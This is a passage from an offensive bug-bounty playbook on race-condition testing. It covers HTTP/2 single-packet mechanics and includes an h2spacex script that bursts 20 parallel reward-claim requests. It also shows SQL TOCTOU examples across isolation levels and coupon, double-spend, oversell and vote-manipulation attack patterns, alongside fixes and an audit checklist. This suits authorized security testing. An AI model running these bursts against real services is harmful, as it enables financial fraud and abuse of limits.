---
name: playbook-src-race-condition-test-part3
description: "结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。（第 3/4 部分）"
tags: [playbook, src-hunting, race, condition, test]
intent: offensive
---
## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `logic-test.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 TCP Nagle Algorithm & Frame Coalescing

TCP's Nagle algorithm (RFC 896) buffers small writes and coalesces them into fewer, larger segments. When an HTTP/2 client writes multiple HEADERS+DATA frames in rapid succession **without flushing between them**, the kernel merges them into a single TCP segment (up to MSS, typically ~1460 bytes on Ethernet).

```text
Application layer:   [Stream 1 H+D] [Stream 3 H+D] [Stream 5 H+D]
                            ↓ TCP Nagle coalescing ↓
TCP segment:         [Stream 1 H+D | Stream 3 H+D | Stream 5 H+D]  ← one packet on the wire
```

- `TCP_NODELAY` **disabled** (default) → Nagle active → coalescing happens naturally
- If `TCP_NODELAY` is set, the client must use `writev()` / gather-write syscall to batch frames
- Practical limit: ~20–30 small requests per 1460-byte MSS; exceeding this splits across packets and degrades synchronization

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  sub-microsecond spacing
  └─ Stream 5 → worker thread C ─┘
```

1. Single `recv()` syscall returns the entire segment
2. HTTP/2 frame parser demultiplexes streams from same segment
3. Dispatcher fans out to application worker pool

First-to-last request dispatch gap: **< 100 μs** on modern servers — orders of magnitude tighter than HTTP/1.1 last-byte sync (~1–5 ms network jitter).

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Same TCP segment | N segments released "simultaneously" |
| Network jitter impact | Zero (same packet) | Each connection has independent RTT |
| Server dispatch gap | < 100 μs | 1–5 ms typical |
| Practical limit | ~20–30 requests per MTU | Limited by connection setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← probe pre-state
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← probe post-state
```

Balance inconsistency between stream 1 and stream 7 confirms the race window was hit.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

> （续前：playbook-src-race-condition-test 第 3/4 部分）
